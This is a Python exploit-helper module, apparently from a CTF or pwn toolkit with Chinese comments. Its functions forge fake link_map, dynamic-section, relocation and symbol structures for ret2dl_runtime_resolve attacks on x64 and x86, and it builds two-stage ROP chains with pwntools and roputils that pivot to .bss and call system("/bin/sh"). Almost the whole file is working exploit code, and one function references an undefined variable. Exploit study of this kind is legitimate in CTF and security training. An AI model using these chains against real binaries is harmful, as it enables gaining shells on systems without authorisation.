# -*- coding:utf-8 -*-
from pwn import p64, flat, log, ELF

# offset = 44
# elf = ELF("./pwn")


def x64_get_fake_link_map(fake_link_map_addr, l_addr, st_value):
    """
    l_addr = libc.sym['system'] - libc.sym['__libc_start_main'] # l->l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数
    log.info("l_addr :" + str(hex(l_addr)))
    log.info("elf.got['__libc_start_main'] :" + str(hex(elf.got['__libc_start_main'])))
    # log.info("plt_load :" + str(hex(0x4004e6)))
    # log.info("write_addr :" + str(hex(write_addr)))
    # l->l_addr + sym->st_value
    # value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
    st_value = elf.got['__libc_start_main']
    fake_link_map = stack_vuln.ret_to_dl_runtime.x64_get_fake_link_map(fake_link_map_addr,l_addr,st_value)
    # cmd_str_addr = fake_link_map_addr + 0x78

    - 提前在栈上布置好偏移和offset，进入_dl_runtime_resolve函数的入口
    - 修改link_map表地址 直接调用xxx@plt
    """
    # 给出各个指针的假地址
    fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)
    fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + 0x8)
    fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + 0x18)

    # 伪造相关结构体
    fake_Elf64_Dyn_SYM = flat(p64(0), p64(st_value - 8))
    # JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28
    fake_Elf64_Dyn_JMPREL = flat(p64(0), p64(fake_link_map_addr + 0x28))
    r_offset = fake_link_map_addr - l_addr
    log.info("r_offset :" + hex(r_offset))
    fake_Elf64_rela = flat(p64(r_offset), p64(7), p64(0))

    # fake_link_map整体结构
    fake_link_map = [
        p64(l_addr),  # 0x0
        fake_Elf64_Dyn_SYM,  # 0x8
        fake_Elf64_Dyn_JMPREL,  # 0x18
        fake_Elf64_rela,  # 0x28 offset 0
        fake_Elf64_rela,  # 0x40 offset 1
        "\x00" * (0x28 - 0x18),  # 0x58
        fake_Elf64_Dyn_STR_addr,  # 0x68 DT_STRTAB 指针
        fake_Elf64_Dyn_SYM_addr,  # 0x70 DT_SYMTAB 指针
        "/bin/sh\x00".ljust(0x80, "\x00"),  # 0x78
        fake_Elf64_Dyn_JMPREL_addr,  # 0xF8 JMPREL指针
    ]
    return flat(fake_link_map)


def x64_get_fake_link_map_2(fake_link_map_addr, l_addr, st_value):
    """
    Usage: like function get_fake_link_map()
    0x6032f0:	0x0000000000024c50	0x0000000000000000 <- 0x0: l_addr == ret_addr
    0x603300:	0x0000000000000000	0x0000000000000000 <- 0x18: reloc.offset (0)
    0x603310:	0x0000000000000000	0x0000000000000000
    0x603320:	0x00000000005de6c8	0x0000000000000007 <- reloc.offset (1)
    0x603330:	0x0000000000000000	0x0000000000000000
    0x603340:	0x0000000000000000	0x0000000000000000
    0x603350:	0x0000000000000000	0x00000000006032f0 <- 0x68: Dyn_STR 指针
    0x603360:	0x0000000000603360	0x0000000000602068 <- 0x70: Dyn_SYM 指针, 0x78: fake_Elf64_Dyn_JMPREL == sym->st_value 
    0x603370:	0x0000000000603308	0x0000000000000000 <- 0x80: fake .rel.plt
    0x603380:	0x0000000000000000	0x0000000000000000
    0x603390:	0x0000000000000000	0x0000000000000000
    0x6033a0:	0x0000000000000000	0x0000000000000000
    0x6033b0:	0x0000000000000000	0x0000000000000000
    0x6033c0:	0x0000000000000000	0x0000000000000000
    0x6033d0:	0x0000000000000000	0x0000000000000000
    0x6033e0:	0x0000000000000000	0x0000000000603368 <- 0xf8: fake_Elf64_Dyn_JMPREL_addr
    """

    fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)
    fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + 0x70)
    fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + 0x78)
    r_offset = fake_link_map_addr - l_addr

    fake_link_map = [p64(0) for _ in range(32)]
    fake_link_map[0] = p64(l_addr)
    fake_link_map[6] = p64(r_offset)  # reloc 0x30
    fake_link_map[7] = p64(7)
    fake_link_map[8] = p64(0)
    fake_link_map[13] = fake_Elf64_Dyn_STR_addr  # 0x68
    fake_link_map[14] = fake_Elf64_Dyn_SYM_addr  # 0x70
    fake_link_map[15] = p64(st_value - 8)  # 0x78
    fake_link_map[16] = p64(fake_link_map_addr + 0x18)  # 0x80
    fake_link_map[31] = fake_Elf64_Dyn_JMPREL_addr

    return flat(fake_link_map)


def x32_use_roputils(file_path, offset):
    """
    Usage: just send buf_1, then send buf_2.
    """
    from roputils import ROP

    rop = ROP(file_path)

    bss_base = rop.section(".bss")
    buf_1 = rop.fill(offset)

    buf_1 += rop.call("read", 0, bss_base, 100)
    # used to call dl_Resolve()
    buf_1 += rop.dl_resolve_call(bss_base + 0x10, bss_base)

    buf_2 = rop.string("/bin/sh")
    buf_2 += rop.fill(0x10, buf)
    # used to make faking data, such relocation, Symbol, Str
    buf_2 += rop.dl_resolve_data(bss_base + 0x10, "system")
    buf_2 += rop.fill(100, buf)

    return buf_1, buf_2


def x32_use_pwntools(file_path, offset):
    """
    Usage: just send rop_1, then send rop_2.
    """
    from pwn import ROP

    rop_1 = ROP(file_path)
    elf = ELF(file_path)
    bss_addr = elf.bss()
    stack_size = 0x800
    base_stage = bss_addr + stack_size
    rop_1.raw("a" * offset)
    rop_1.read(0, base_stage, 100)
    rop_1.migrate(base_stage)
    # io.sendline(rop_1.chain())

    rop_2 = ROP(file_path)
    plt0 = elf.get_section_by_name(".plt").header.sh_addr
    rel_plt = elf.get_section_by_name(".rel.plt").header.sh_addr
    dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
    dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

    fake_sym_addr = base_stage + 0x20
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xF)
    fake_sym_addr += align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    st_name = fake_sym_addr + 0x10 - dynstr
    fake_sys = flat([st_name, 0, 0, 0x12])
    index_offset = base_stage + 24 - rel_plt
    read_got = elf.got["setvbuf"]
    r_info = index_dynsym << 8 | 0x7
    fake_sys_rel = flat([read_got, r_info])
    sh = "/bin/sh"

    rop_2.raw(plt0)
    rop_2.raw(index_offset)
    rop_2.raw("bbbb")
    rop_2.raw(base_stage + 82)
    rop_2.raw("bbbb")
    rop_2.raw("bbbb")

    rop_2.raw(fake_sys_rel)
    rop_2.raw(align * "a")
    rop_2.raw(fake_sys)
    rop_2.raw("system\x00")
    rop_2.raw("a" * (80 - len(rop_2.chain())))
    rop_2.raw(sh + "\x00")
    rop_2.raw("a" * (100 - len(rop_2.chain())))
    # io.sendline(rop.chain())

    return rop_1, rop_2
